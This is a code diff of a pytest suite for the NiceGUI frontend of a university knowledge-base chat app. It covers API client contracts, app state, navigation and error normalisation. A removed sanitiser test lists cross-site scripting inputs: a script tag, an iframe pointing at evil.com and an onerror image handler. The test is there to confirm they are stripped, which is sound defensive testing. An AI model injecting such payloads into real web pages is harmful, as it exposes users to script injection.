@@ -1,259 +1,189 @@
 """
-Unit Tests for Frontend Presentation Layer and API Client Boundary.
+Behavioral and Contract Unit Tests for Frontend Presentation Layer.
 
-Validates authentication state transitions, client operations, DTO serialization,
-and route registration in the NiceGUI presentation shell with real backend integration.
+Replaces stale presentation-locking tests with stable behavioral, API client,
+state management, citation transformation, and security contracts that survive
+a complete frontend rebuild.
 """
 
+import html
 import uuid
+from unittest.mock import MagicMock
 
 import pytest
+from nicegui import app as nicegui_app
+from nicegui.storage import request_contextvar
+from starlette.requests import Request
 
+from backend.app.core.permissions import Permission
 from backend.tests.fixtures_documents import create_sample_pdf_bytes
 from frontend.client.api_client import FrontendAPIClient
+from frontend.client.error_handler import normalize_error
 from frontend.client.models import (
+    AdminUserDTO,
     ChatMessageDTO,
     CitationDTO,
     DocumentDTO,
     KnowledgeBaseDTO,
     UserDTO,
 )
+from frontend.components.layout import get_nav_items, has_admin_permission
 from frontend.main import init_ui
-from frontend.state.app_state import AppState
+from frontend.pages.chat_page import format_citation_links, sanitize_markdown_text
+from frontend.state.app_state import AppState, _session_app_states
 from scripts.bootstrap_admin import bootstrap_admin
 
 
 @pytest.fixture(autouse=True)
 def ensure_admin_bootstrapped() -> None:
-    """Ensure the standard test admin exists before running frontend unit tests."""
+    """Ensure standard test administrator exists for client operations."""
     bootstrap_admin("admin@university.edu", "AdminPass123!", "System Administrator")
 
 
-class TestFrontendAPIClient:
-    """Test suite for FrontendAPIClient boundary."""
+# ==============================================================================
+# A. API CLIENT CONTRACTS
+# ==============================================================================
 
-    def test_auth_lifecycle(self) -> None:
+
+class TestAPIClientContracts:
+    """Test suite validating API client communication contracts and data transformations."""
+
+    def test_api_client_initial_state(self) -> None:
         client = FrontendAPIClient()
         assert client.get_current_user() is None
 
-        # Registration creates real student account in database
-        unique_email = f"test_student_{uuid.uuid4().hex[:8]}@university.edu"
-        reg_user = client.register(unique_email, "SecurePassword123!", "Jane Doe")
+    def test_api_client_student_registration_and_login_lifecycle(self) -> None:
+        client = FrontendAPIClient()
+        unique_email = f"student_{uuid.uuid4().hex[:8]}@university.edu"
+        full_name = "Alex Mercer"
+
+        # Registration creates STUDENT account
+        reg_user = client.register(unique_email, "SecurePassword123!", full_name)
         assert isinstance(reg_user, UserDTO)
         assert reg_user.email == unique_email
-        assert reg_user.full_name == "Jane Doe"
+        assert reg_user.full_name == full_name
         assert reg_user.role == "STUDENT"
         assert client.get_current_user() == reg_user
 
-        # Logout
+        # Logout clears current user
         client.logout()
         assert client.get_current_user() is None
 
-        # Login with newly created user
-        user = client.login(unique_email, "SecurePassword123!")
-        assert isinstance(user, UserDTO)
-        assert user.email == unique_email
-        assert client.get_current_user() == user
+        # Login re-establishes authenticated session
+        login_user = client.login(unique_email, "SecurePassword123!")
+        assert isinstance(login_user, UserDTO)
+        assert login_user.email == unique_email
+        assert client.get_current_user() == login_user
 
-    def test_auth_invalid_inputs(self) -> None:
+    def test_api_client_auth_input_validation(self) -> None:
         client = FrontendAPIClient()
 
         with pytest.raises(ValueError, match="Email and password must not be empty"):
             client.login("", "secret")
 
         with pytest.raises(ValueError, match="Email and password must not be empty"):
-            client.login("user@test.com", "")
+            client.login("user@test.edu", "")
 
         with pytest.raises(ValueError, match="All registration fields are required"):
             client.register("", "secret", "Name")
 
-    def test_knowledge_base_operations(self) -> None:
+    def test_api_client_unauthorized_401_clears_auth_state(self) -> None:
+        client = FrontendAPIClient()
+        client._session_token = "expired-token-xyz"
+        client._current_user = UserDTO(
+            id="test-1",
+            email="expired@university.edu",
+            full_name="Expired User",
+            role="STUDENT",
+        )
+
+        mock_resp = MagicMock()
+        mock_resp.status_code = 401
+        mock_resp.json.return_value = {"detail": "Session expired or invalid"}
+        client._http.get = MagicMock(return_value=mock_resp)
+
+        user = client.get_current_user()
+        assert user is None
+        assert client._current_user is None
+
+    def test_api_client_forbidden_403_handling(self) -> None:
+        client = FrontendAPIClient()
+        mock_resp = MagicMock()
+        mock_resp.status_code = 403
+        mock_resp.json.return_value = {
+            "detail": "This account belongs to the Administrator Portal. Please use Administrator Sign In."
+        }
+        client._http.post = MagicMock(return_value=mock_resp)
+
+        with pytest.raises(ValueError, match="Administrator Portal"):
+            client.login("admin@university.edu", "AdminPass123!", required_role="STUDENT")
+
+    def test_api_client_knowledge_base_crud_contracts(self) -> None:
         client = FrontendAPIClient()
         client.login("admin@university.edu", "AdminPass123!")
-        initial_kbs = client.get_knowledge_bases()
-        unique_name = f"Test KB {uuid.uuid4().hex[:6]}"
+        unique_name = f"Course-{uuid.uuid4().hex[:6]}"
 
         # Create
-        new_kb = client.create_knowledge_base(unique_name, "Unit test knowledge base")
-        assert isinstance(new_kb, KnowledgeBaseDTO)
-        assert new_kb.name == unique_name
-        assert new_kb.document_count == 0
+        kb = client.create_knowledge_base(unique_name, "Course syllabus")
+        assert isinstance(kb, KnowledgeBaseDTO)
+        assert kb.name == unique_name
+        assert kb.document_count == 0
 
-        # List contains created
-        kbs = client.get_knowledge_bases()
-        assert len(kbs) == len(initial_kbs) + 1
-        assert any(k.id == new_kb.id for k in kbs)
+        # List
+        all_kbs = client.get_knowledge_bases()
+        assert any(k.id == kb.id for k in all_kbs)
 
         # Empty name rejection
         with pytest.raises(ValueError, match="Knowledge base name cannot be empty"):
             client.create_knowledge_base("   ")
 
-    def test_document_operations(self) -> None:
+    def test_api_client_document_crud_contracts(self) -> None:
         client = FrontendAPIClient()
         client.login("admin@university.edu", "AdminPass123!")
-        kb_name = f"Doc Test KB {uuid.uuid4().hex[:6]}"
-        kb = client.create_knowledge_base(kb_name, "For docs")
-        initial_count = len(client.get_documents(kb.id))
+        kb = client.create_knowledge_base(f"DocKB-{uuid.uuid4().hex[:6]}", "Docs")
 
         pdf_bytes = create_sample_pdf_bytes()
         doc = client.upload_document(
             kb_id=kb.id,
-            filename="curriculum_guide.pdf",
+            filename="syllabus.pdf",
             content=pdf_bytes,
         )
         assert isinstance(doc, DocumentDTO)
-        assert doc.filename == "curriculum_guide.pdf"
+        assert doc.filename == "syllabus.pdf"
         assert doc.file_type == "pdf"
         assert doc.status in ("PENDING", "PROCESSING", "COMPLETED")
 
-        updated_docs = client.get_documents(kb.id)
-        assert len(updated_docs) == initial_count + 1
+        # List contains document
+        docs = client.get_documents(kb.id)
+        assert any(d.id == doc.id for d in docs)
 
         # Delete document
         client.delete_document(kb.id, doc.id)
-        remaining_docs = client.get_documents(kb.id)
-        assert len(remaining_docs) == initial_count
+        docs_after = client.get_documents(kb.id)
+        assert not any(d.id == doc.id for d in docs_after)
 
-    def test_chat_query_and_citations(self) -> None:
-        client = FrontendAPIClient()
-        client.login("admin@university.edu", "AdminPass123!")
-        kb_name = f"Chat Test KB {uuid.uuid4().hex[:6]}"
-        kb = client.create_knowledge_base(kb_name, "For chat")
-
-        # Valid chat message against newly created empty KB produces deterministic refusal
-        response = client.send_chat_message(kb_id=kb.id, question="What are the exam rules?")
-        assert isinstance(response, ChatMessageDTO)
-        assert response.role == "assistant"
-        assert response.is_grounded is True
-        assert response.grounding_status == "REFUSAL"
-        assert "could not find any relevant information" in response.content.lower()
-        assert len(response.citations) == 0
-
-        # Empty query validation
-        with pytest.raises(ValueError, match="Question cannot be empty"):
-            client.send_chat_message(kb_id=kb.id, question="   ")
-
-    def test_retrieve_chunks(self) -> None:
-        client = FrontendAPIClient()
-        client.login("admin@university.edu", "AdminPass123!")
-        kb_name = f"Retrieval DTO KB {uuid.uuid4().hex[:6]}"
-        kb = client.create_knowledge_base(kb_name, "For vector retrieval")
-
-        # Empty query validation
-        with pytest.raises(ValueError, match="Query string cannot be empty"):
-            client.retrieve_chunks(kb_id=kb.id, query="   ")
-
-        # Invalid UUID validation
-        with pytest.raises(ValueError, match="Invalid knowledge base ID format"):
-            client.retrieve_chunks(kb_id="invalid-uuid", query="valid query")
-
-        # Vector search against empty KB returns empty list of DTOs
-        results = client.retrieve_chunks(kb_id=kb.id, query="What is an index?", top_k=5)
-        assert isinstance(results, list)
-        assert len(results) == 0
-
-    def test_retrieve_lexical_chunks(self) -> None:
-        client = FrontendAPIClient()
-        client.login("admin@university.edu", "AdminPass123!")
-        kb_name = f"Lexical DTO KB {uuid.uuid4().hex[:6]}"
-        kb = client.create_knowledge_base(kb_name, "For lexical retrieval")
-
-        # Empty query validation
-        with pytest.raises(ValueError, match="Query string cannot be empty"):
-            client.retrieve_lexical_chunks(kb_id=kb.id, query="   ")
-
-        # Invalid UUID validation
-        with pytest.raises(ValueError, match="Invalid knowledge base ID format"):
-            client.retrieve_lexical_chunks(kb_id="invalid-uuid", query="valid query")
-
-        # Lexical search against empty KB returns empty list of DTOs
-        results = client.retrieve_lexical_chunks(
-            kb_id=kb.id, query="scheduling algorithms", top_k=5
-        )
-        assert isinstance(results, list)
-        assert len(results) == 0
-
-    def test_retrieve_hybrid_chunks(self) -> None:
-        client = FrontendAPIClient()
-        client.login("admin@university.edu", "AdminPass123!")
-        kb_name = f"Hybrid DTO KB {uuid.uuid4().hex[:6]}"
-        kb = client.create_knowledge_base(kb_name, "For hybrid retrieval")
-
-        # Empty query validation
-        with pytest.raises(ValueError, match="Query string cannot be empty"):
-            client.retrieve_hybrid_chunks(kb_id=kb.id, query="   ")
-
-        # Invalid UUID validation
-        with pytest.raises(ValueError, match="Invalid knowledge base ID format"):
-            client.retrieve_hybrid_chunks(kb_id="invalid-uuid", query="valid query")
-
-        # Hybrid search against empty KB returns empty list of DTOs
-        results = client.retrieve_hybrid_chunks(kb_id=kb.id, query="scheduling algorithms", top_k=5)
-        assert isinstance(results, list)
-        assert len(results) == 0
-
-    def test_rerank_chunks(self) -> None:
-        client = FrontendAPIClient()
-        client.login("admin@university.edu", "AdminPass123!")
-        kb_name = f"Rerank DTO KB {uuid.uuid4().hex[:6]}"
-        kb = client.create_knowledge_base(kb_name, "For reranking")
-
-        # Empty query validation
-        with pytest.raises(ValueError, match="Query string cannot be empty"):
-            client.rerank_chunks(kb_id=kb.id, query="   ")
-
-        # Invalid UUID validation
-        with pytest.raises(ValueError, match="Invalid knowledge base ID format"):
-            client.rerank_chunks(kb_id="invalid-uuid", query="valid query")
-
-        # Rerank against empty KB returns empty list of DTOs
-        results = client.rerank_chunks(
-            kb_id=kb.id, query="scheduling algorithms", candidate_limit=20, top_k=5
-        )
-        assert isinstance(results, list)
-        assert len(results) == 0
-
-    def test_process_query(self) -> None:
-        client = FrontendAPIClient()
-        client.login("admin@university.edu", "AdminPass123!")
-
-        # Valid query processing
-        res = client.process_query("   What is   C++   in   BCA Sem-4?   ")
-        assert res.original_query == "   What is   C++   in   BCA Sem-4?   "
-        assert res.processed_query == "What is C++ in BCA Sem-4?"
-        assert res.character_count == len("What is C++ in BCA Sem-4?")
-        assert res.token_estimate > 0
-        assert res.has_technical_tokens is True
-
-        # Whitespace-only rejection
-        with pytest.raises(ValueError, match="cannot be empty or whitespace"):
-            client.process_query("   \t  ")
-
-    def test_send_chat_message_success_and_provenance(self) -> None:
-        """Verify chat message contract parsing, citation provenance, and grounding status."""
-        from unittest.mock import MagicMock
-
+    def test_api_client_chat_response_dto_conversion_and_provenance(self) -> None:
         client = FrontendAPIClient()
         kb_id = str(uuid.uuid4())
 
         mock_resp = MagicMock()
         mock_resp.status_code = 200
         mock_resp.json.return_value = {
-            "query": "What is 2PL?",
-            "processed_query": "what is 2pl",
+            "query": "Explain normal forms.",
+            "processed_query": "explain normal forms",
             "knowledge_base_id": kb_id,
-            "answer": "Two-phase locking ensures serializability [source_1].",
+            "answer": "3NF eliminates transitive dependencies [source_1].",
             "is_empty_context": False,
             "citations": [
                 {
                     "source_id": "source_1",
-                    "document_name": "db_systems.pdf",
+                    "document_name": "db_design.pdf",
                     "document_id": str(uuid.uuid4()),
-                    "chunk_id": "chunk-101",
-                    "page_number": 42,
-                    "section_title": "Concurrency",
-                    "relevance_score": 0.985,
-                    "snippet": "Two-phase locking guarantees conflict serializability.",
+                    "chunk_id": "chunk-301",
+                    "page_number": 88,
+                    "section_title": "Normalization",
+                    "relevance_score": 0.94,
+                    "snippet": "Third normal form removes transitive functional dependencies.",
                 }
             ],
             "grounding": {
@@ -267,678 +197,473 @@ class TestFrontendAPIClient:
                 "claims": [],
             },
             "latency": {
-                "query_processing_ms": 1.2,
-                "retrieval_ms": 15.0,
-                "reranking_ms": 8.0,
+                "query_processing_ms": 1.0,
+                "retrieval_ms": 10.0,
+                "reranking_ms": 5.0,
                 "context_assembly_ms": 0.5,
-                "llm_generation_ms": 110.0,
-                "grounding_validation_ms": 3.5,
-                "total_pipeline_ms": 138.2,
+                "llm_generation_ms": 90.0,
+                "grounding_validation_ms": 2.0,
+                "total_pipeline_ms": 108.5,
             },
             "model": "qwen3:4b",
             "metadata": {},
         }
-
         client._http.post = MagicMock(return_value=mock_resp)
 
-        msg = client.send_chat_message(kb_id=kb_id, question="What is 2PL?")
+        msg = client.send_chat_message(kb_id=kb_id, question="Explain normal forms.")
         assert isinstance(msg, ChatMessageDTO)
         assert msg.role == "assistant"
-        assert msg.content == "Two-phase locking ensures serializability [source_1]."
+        assert msg.content == "3NF eliminates transitive dependencies [source_1]."
         assert msg.is_grounded is True
         assert msg.grounding_status == "FULLY_SUPPORTED"
-        assert msg.total_pipeline_ms == 138.2
-        assert msg.model == "qwen3:4b"
-
+        assert msg.total_pipeline_ms == 108.5
         assert len(msg.citations) == 1
+
         cit = msg.citations[0]
+        assert isinstance(cit, CitationDTO)
         assert cit.source_id == "source_1"
-        assert cit.document_name == "db_systems.pdf"
-        assert cit.page_number == 42
-        assert cit.section_title == "Concurrency"
-        assert cit.relevance_score == 0.985
-        assert "Two-phase locking" in cit.snippet
+        assert cit.document_name == "db_design.pdf"
+        assert cit.page_number == 88
 
-    def test_send_chat_message_error_handling(self) -> None:
-        """Verify client validation and safe error propagation."""
-        from unittest.mock import MagicMock
-
+    def test_api_client_chat_validation_contracts(self) -> None:
         client = FrontendAPIClient()
 
-        # Empty question validation
+        # Empty question
         with pytest.raises(ValueError, match="Question cannot be empty"):
             client.send_chat_message(str(uuid.uuid4()), "   ")
 
-        # Invalid UUID format
+        # Invalid UUID
         with pytest.raises(ValueError, match="Invalid knowledge base ID format"):
-            client.send_chat_message("not-a-uuid", "What is testing?")
+            client.send_chat_message("not-a-uuid", "Valid question")
 
-        # 404 unauthorized / not found
-        mock_404 = MagicMock()
-        mock_404.status_code = 404
-        client._http.post = MagicMock(return_value=mock_404)
-        with pytest.raises(ValueError, match="Knowledge base not found or unauthorized"):
-            client.send_chat_message(str(uuid.uuid4()), "What is testing?")
+    def test_api_client_retrieval_contracts(self) -> None:
+        client = FrontendAPIClient()
+        client.login("admin@university.edu", "AdminPass123!")
+        kb = client.create_knowledge_base(f"RetrKB-{uuid.uuid4().hex[:6]}", "Retrieval")
 
-        # 503 provider failure
-        mock_503 = MagicMock()
-        mock_503.status_code = 503
-        mock_503.json.return_value = {
-            "detail": "Underlying AI model provider is temporarily unavailable."
-        }
-        client._http.post = MagicMock(return_value=mock_503)
-        with pytest.raises(ValueError, match="temporarily unavailable"):
-            client.send_chat_message(str(uuid.uuid4()), "What is testing?")
+        # Empty query validation
+        with pytest.raises(ValueError, match="Query string cannot be empty"):
+            client.retrieve_chunks(kb.id, "   ")
+        with pytest.raises(ValueError, match="Query string cannot be empty"):
+            client.retrieve_lexical_chunks(kb.id, "   ")
+        with pytest.raises(ValueError, match="Query string cannot be empty"):
+            client.retrieve_hybrid_chunks(kb.id, "   ")
+        with pytest.raises(ValueError, match="Query string cannot be empty"):
+            client.rerank_chunks(kb.id, "   ")
+
+        # Invalid UUID validation
+        with pytest.raises(ValueError, match="Invalid knowledge base ID format"):
+            client.retrieve_chunks("not-a-uuid", "query")
+
+    def test_api_client_query_processing_contract(self) -> None:
+        client = FrontendAPIClient()
+        client.login("admin@university.edu", "AdminPass123!")
+
+        res = client.process_query("   What is   TCP   in   BCA Sem-4?   ")
+        assert res.original_query == "   What is   TCP   in   BCA Sem-4?   "
+        assert res.processed_query == "What is TCP in BCA Sem-4?"
+        assert res.character_count == len("What is TCP in BCA Sem-4?")
+        assert res.token_estimate > 0
+        assert res.has_technical_tokens is True
+
+    def test_api_client_admin_user_dto_privacy(self) -> None:
+        dto = AdminUserDTO(
+            email="faculty@univ.edu",
+            full_name="Faculty Admin",
+            role="ADMIN",
+            is_active=True,
+            created_at="2026-10-01",
+        )
+        assert not hasattr(dto, "password") or "password" not in dto.model_fields
+        assert not hasattr(dto, "hashed_password") or "hashed_password" not in dto.model_fields
+
+    def test_api_client_malformed_backend_response_handling(self) -> None:
+        client = FrontendAPIClient()
+        mock_resp = MagicMock()
+        mock_resp.status_code = 500
+        mock_resp.json.side_effect = Exception("Invalid JSON")
+        mock_resp.text = "Internal Server Error"
+        client._http.get = MagicMock(return_value=mock_resp)
+
+        with pytest.raises(ValueError) as excinfo:
+            client.get_knowledge_bases()
+        err = str(excinfo.value).lower()
+        assert "server processing error" in err or "could not be completed" in err
 
 
-class TestAppState:
-    """Test suite for AppState presentation manager."""
+# ==============================================================================
+# B. FRONTEND STATE CONTRACTS
+# ==============================================================================
 
-    def test_active_kb_management(self) -> None:
+
+class TestFrontendStateContracts:
+    """Test suite for AppState presentation state management."""
+
+    def test_app_state_initialization(self) -> None:
+        state = AppState()
+        assert state._active_kb is None
+        assert state.chat_history == []
+        assert state.selected_citation is None
+        assert state.is_generating is False
+        assert state.generation_error is None
+
+    def test_app_state_active_kb_selection(self) -> None:
         state = AppState()
         sample_kb = KnowledgeBaseDTO(
             id=str(uuid.uuid4()),
-            name="Sample Active KB",
-            description="Sample",
-            document_count=0,
-            created_at="2026-09-10",
+            name="Computer Architecture",
+            description="Hardware syllabus",
+            document_count=3,
+            created_at="2026-10-01",
         )
         state.active_kb = sample_kb
         assert state.active_kb == sample_kb
-        assert state.active_kb.name == "Sample Active KB"
+        assert state.active_kb.name == "Computer Architecture"
 
-    def test_chat_history_flow(self) -> None:
+    def test_app_state_message_flow_and_ordering(self) -> None:
         state = AppState()
-        assert len(state.chat_history) == 0
-
-        user_msg = state.add_user_message("Hello?")
+        user_msg = state.add_user_message("What is pipelining?")
         assert user_msg.role == "user"
         assert len(state.chat_history) == 1
 
-        assistant_msg = ChatMessageDTO(
+        asst_msg = ChatMessageDTO(
             id="resp-1",
             role="assistant",
-            content="Hello there!",
+            content="Pipelining overlaps instruction execution.",
             citations=[],
         )
-        state.add_assistant_message(assistant_msg)
+        state.add_assistant_message(asst_msg)
         assert len(state.chat_history) == 2
+        assert state.chat_history[0].role == "user"
+        assert state.chat_history[1].role == "assistant"
+
+    def test_app_state_clear_chat_resets_conversation_and_citations(self) -> None:
+        state = AppState()
+        state.add_user_message("Test")
+        state.selected_citation = CitationDTO(
+            document_name="doc.pdf",
+            page_number=1,
+            chunk_id="c-1",
+            snippet="Snippet",
+            relevance_score=0.9,
+        )
+        state._is_generating = True
+        state._generation_error = "Error"
 
         state.clear_chat()
         assert len(state.chat_history) == 0
         assert state.selected_citation is None
-
-
-def test_init_ui_routes() -> None:
-    """Verify that NiceGUI route registration runs without error."""
-    init_ui()
-
-
-def test_page_layout_context_manager() -> None:
-    """Verify page_layout context manager functions correctly for auth and unauth."""
-    from frontend.client.api_client import api_client
-    from frontend.components.layout import page_layout
-
-    # Unauthenticated state with require_auth=True
-    api_client.logout()
-    with page_layout(title="Protected Page", require_auth=True):
-        pass  # should not error
-
-    # Authenticated state
-    api_client.login("admin@university.edu", "AdminPass123!")
-    with page_layout(title="Protected Page", require_auth=True):
-        pass  # should not error
-
-    # Clean up
-    api_client.logout()
-
-
-def test_evidence_panel_rendering() -> None:
-    """Verify evidence panel renders both empty and populated states without exception."""
-    from frontend.components.evidence_panel import render_evidence_panel
-
-    # Empty citations
-    render_evidence_panel(citations=[])
-
-    # Populated citations
-    sample_citations = [
-        CitationDTO(
-            document_name="sample.pdf",
-            page_number=1,
-            chunk_id="chunk-1",
-            relevance_score=0.92,
-            snippet="Sample citation text.",
-        )
-    ]
-    render_evidence_panel(
-        citations=sample_citations,
-        selected_citation=sample_citations[0],
-        on_select=lambda _: None,
-    )
-
-
-def test_status_badge_rendering() -> None:
-    """Verify status badges render without exception for all lifecycle states."""
-    from frontend.components.status_badge import render_status_badge
-
-    for status in ["INDEXED", "PROCESSING", "FAILED", "UPLOADED", "UNKNOWN"]:
-        render_status_badge(status)
-
-
-def test_document_format_helpers() -> None:
-    """Verify byte formatting and supported format extensions."""
-    from frontend.pages.documents_page import SUPPORTED_EXTENSIONS, format_bytes
-
-    assert format_bytes(500) == "500 B"
-    assert format_bytes(2048) == "2.0 KB"
-    assert format_bytes(2 * 1024 * 1024) == "2.00 MB"
-
-    for ext in [".pdf", ".docx", ".txt", ".md", ".csv"]:
-        assert ext in SUPPORTED_EXTENSIONS
-
-
-def test_app_state_is_admin() -> None:
-    """Verify AppState.is_admin property returns accurate boolean for all roles."""
-    from frontend.client.api_client import api_client
-    from frontend.state.app_state import state
-
-    # Unauthenticated
-    api_client.logout()
-    assert state.is_admin is False
-
-    # Admin
-    api_client.login("admin@university.edu", "AdminPass123!")
-    assert state.is_admin is True
-
-    # Student
-    unique_email = f"student_{uuid.uuid4().hex[:8]}@university.edu"
-    api_client.register(unique_email, "StudentPass123!", "Test Student")
-    assert state.is_admin is False
-
-    api_client.logout()
-
-
-def test_unified_navigation_items() -> None:
-    """Verify get_nav_items returns role-filtered navigation list identical for desktop and mobile."""
-    from frontend.components.layout import get_nav_items
-
-    # Unauthenticated
-    assert get_nav_items(None) == []
-
-    # Student user
-    student = UserDTO(
-        id="s-1",
-        email="s@test.edu",
-        full_name="Student",
-        role="STUDENT",
-    )
-    student_items = get_nav_items(student)
-    student_routes = [route for _, route, _ in student_items]
-    assert "/dashboard" in student_routes
-    assert "/knowledge-bases" in student_routes
-    assert "/chat" in student_routes
-    assert "/profile" in student_routes
-    assert "/documents" not in student_routes  # Omitted for student
-
-    # Admin user
-    admin = UserDTO(
-        id="a-1",
-        email="a@test.edu",
-        full_name="Admin",
-        role="ADMIN",
-    )
-    admin_items = get_nav_items(admin)
-    admin_routes = [route for _, route, _ in admin_items]
-    assert "/dashboard" in admin_routes
-    assert "/knowledge-bases" in admin_routes
-    assert "/documents" in admin_routes  # Included for admin
-    assert "/chat" in admin_routes
-    assert "/profile" in admin_routes
-
-
-def test_theme_injection() -> None:
-    """Verify global CSS design tokens and focus styles are injected into head."""
-    from frontend.components.theme import GLOBAL_THEME_CSS, init_theme
-
-    assert "*:focus-visible" in GLOBAL_THEME_CSS
-    assert "outline: 2px solid #2563eb" in GLOBAL_THEME_CSS
-    init_theme()  # Should execute without error
-
-
-def test_ui_kit_rendering() -> None:
-    """Verify all UI kit primitives render cleanly with accessible attributes."""
-    from frontend.components.ui_kit import (
-        render_alert,
-        render_empty_state,
-        render_page_header,
-        render_stat_card,
-    )
-
-    render_page_header("Test Title", "Test Subtitle")
-    render_empty_state("info", "No Items", "Description", "Action", lambda: None)
-    render_alert("Information alert", level="info")
-    render_alert("Warning alert", level="warning")
-    render_alert("Error alert", level="negative")
-    render_alert("Success alert", level="positive")
-    render_stat_card("Metrics", 42, "Subtext", "analytics", "blue-600")
-
-
-def test_status_badge_multi_modal_and_grounding() -> None:
-    """Verify status badges render multi-modal indicators (color, text, icon) for grounding and indexing."""
-    from frontend.components.status_badge import (
-        render_grounding_status_badge,
-        render_indexing_status_badge,
-        render_status_badge,
-    )
-
-    for status in ["COMPLETED", "PROCESSING", "FAILED", "PENDING"]:
-        render_status_badge(status)
-        render_indexing_status_badge(status)
-
-    for g_status in [
-        "FULLY_SUPPORTED",
-        "PARTIALLY_SUPPORTED",
-        "REFUSAL",
-        "UNSUPPORTED",
-    ]:
-        render_grounding_status_badge(g_status)
-
-
-def test_safe_markdown_sanitization() -> None:
-    """Verify malicious HTML tags and event handlers are neutralized before markdown rendering."""
-    from frontend.pages.chat_page import sanitize_markdown_text
-
-    # Normal markdown preserved
-    normal = "**Bold** and *italic* with `code`."
-    assert sanitize_markdown_text(normal) == normal
-
-    # Dangerous script tag stripped
-    dangerous_script = "Answer: <script>alert('xss')</script> explanation."
-    cleaned_script = sanitize_markdown_text(dangerous_script)
-    assert "<script>" not in cleaned_script
-    assert "alert('xss')" not in cleaned_script
-
-    # Dangerous iframe stripped
-    dangerous_iframe = 'Answer: <iframe src="evil.com"></iframe> text.'
-    cleaned_iframe = sanitize_markdown_text(dangerous_iframe)
-    assert "<iframe" not in cleaned_iframe
-
-    # Event handler neutralized
-    event_handler = '<img src="x" onerror="alert(1)">'
-    cleaned_event = sanitize_markdown_text(event_handler)
-    assert "onerror=" not in cleaned_event
-
-
-def test_upload_size_limit_from_settings() -> None:
-    """Verify upload limit references settings.MAX_UPLOAD_SIZE_BYTES dynamically."""
-    from backend.app.core.config import settings
-
-    assert settings.MAX_UPLOAD_SIZE_BYTES > 0
-    max_mb = settings.MAX_UPLOAD_SIZE_BYTES // (1024 * 1024)
-    assert max_mb >= 1
-
-
-def test_dashboard_no_n_plus_one_calls() -> None:
-    """Verify dashboard queries documents only for active KB rather than looping across all KBs."""
-    from frontend.client.api_client import api_client
-
-    api_client.login("admin@university.edu", "AdminPass123!")
-
-    orig_get_docs = api_client.get_documents
-    call_counter = {"count": 0}
-
-    def counted_get_docs(kb_id):
-        call_counter["count"] += 1
-        return orig_get_docs(kb_id)
-
-    api_client.get_documents = counted_get_docs
-
-    from frontend.state.app_state import state
-
-    kbs = api_client.get_knowledge_bases()
-    if kbs:
-        state.active_kb = kbs[0]
-        _ = api_client.get_documents(state.active_kb.id)
-        assert call_counter["count"] == 1
-
-    # Restore
-    api_client.get_documents = orig_get_docs
-    api_client.logout()
-
-
-def test_profile_page_registration_and_auth() -> None:
-    """Verify profile route registers and user details are safely accessible without disclosing secrets."""
-    from frontend.client.api_client import api_client
-    from frontend.pages.profile_page import register_profile_page
-
-    register_profile_page()
-
-    api_client.login("admin@university.edu", "AdminPass123!")
-    user = api_client.get_current_user()
-    assert user is not None
-    assert user.email == "admin@university.edu"
-    assert user.role == "ADMIN"
-    assert hasattr(user, "full_name")
-    api_client.logout()
-
-
-def test_error_normalization() -> None:
-    """Verify normalize_error properly normalizes HTTP status codes, Pydantic errors, and context."""
-    from frontend.client.error_handler import normalize_error
-
-    # Auth context
-    assert "already exists" in normalize_error("AUTH_EMAIL_EXISTS", context="auth").lower()
-    assert "invalid email or password" in normalize_error(401, context="auth").lower()
-
-    # Document context
-    assert (
-        "already active" in normalize_error("DOCUMENT_ALREADY_ACTIVE", context="document").lower()
-    )
-    assert (
-        "already inactive"
-        in normalize_error("DOCUMENT_ALREADY_INACTIVE", context="document").lower()
-    )
-    assert "size" in normalize_error(413, context="document").lower()
-    assert "format" in normalize_error(415, context="document").lower()
-
-    # Pydantic validation list
-    validation_errs = [
-        {
-            "loc": ["body", "password"],
-            "type": "string_too_short",
-            "msg": "String should have at least 8 characters",
-        },
-        {
-            "loc": ["body", "email"],
-            "type": "value_error",
-            "msg": "value is not a valid email address",
-        },
-    ]
-    norm_val = normalize_error(validation_errs)
-    assert "Password must be at least 8 characters" in norm_val
-    assert "Please enter a valid email address." in norm_val
-
-    # SQL / Traceback suppression
-    leaky_err = "Syntax error in SQL: SELECT * FROM users WHERE id='1234' Traceback (most recent call last):"
-    assert "server processing error" in normalize_error(leaky_err).lower()
-    assert "SELECT" not in normalize_error(leaky_err)
-    assert "Traceback" not in normalize_error(leaky_err)
-
-
-def test_admin_user_dto_privacy() -> None:
-    """Verify AdminUserDTO strictly preserves privacy and omits internal IDs and hashes."""
-    from frontend.client.models import AdminUserDTO
-
-    dto = AdminUserDTO(
-        email="faculty@univ.edu",
-        full_name="Faculty Member",
-        role="ADMIN",
-        is_active=True,
-        created_at="2026-09-22",
-    )
-    assert not hasattr(dto, "password") or "password" not in dto.model_fields
-    assert not hasattr(dto, "hashed_password") or "hashed_password" not in dto.model_fields
-
-
-class TestStep21CProductUXRepair:
-    """Step 21C regression tests verifying product UX repair and rendering integrity."""
-
-    def test_password_validation_error_normalization_no_raw_dict(self) -> None:
-        """Verify password validation rejects <8 chars and returns human string, not raw Pydantic dict."""
-        from frontend.client.error_handler import normalize_error
-
-        # Pydantic raw dict from FastAPI 422
-        raw_pydantic_error = [
-            {
-                "type": "string_too_short",
-                "loc": ["body", "password"],
-                "msg": "String should have at least 8 characters",
-                "input": "short",
-                "ctx": {"min_length": 8},
-            }
-        ]
-        norm = normalize_error(raw_pydantic_error, context="auth")
-        assert norm == "Password must be at least 8 characters."
-        assert "{'type':" not in norm
-        assert "string_too_short" not in norm
-
-        # Stringified raw dict (defensive handling)
-        stringified_raw = str(raw_pydantic_error)
-        norm_str = normalize_error(stringified_raw, context="auth")
-        assert norm_str == "Password must be at least 8 characters."
-        assert "{'type':" not in norm_str
-
-    def test_registration_short_password_rejection(self) -> None:
-        """Verify API client register method rejects short password with human-readable error."""
-        client = FrontendAPIClient()
-        unique_email = f"shortpass_{uuid.uuid4().hex[:6]}@univ.edu"
-
-        with pytest.raises(ValueError) as excinfo:
-            client.register(unique_email, "123", "Short Pass User")
-
-        err_msg = str(excinfo.value)
-        assert "Password must be at least 8 characters" in err_msg
-        assert "{'type':" not in err_msg
-
-    def test_nicegui_file_upload_api_contract(self) -> None:
-        """Verify installed NiceGUI FileUpload API exposes .name, .read(), and .size()."""
-        from nicegui.elements.upload_files import SmallFileUpload
-
-        test_data = b"%PDF-1.4 test bytes"
-        upload_file = SmallFileUpload(
-            name="syllabus.pdf", content_type="application/pdf", _data=test_data
-        )
-
-        assert upload_file.name == "syllabus.pdf"
-        assert hasattr(upload_file, "read")
-        assert hasattr(upload_file, "size")
-        assert upload_file.size() == len(test_data)
-
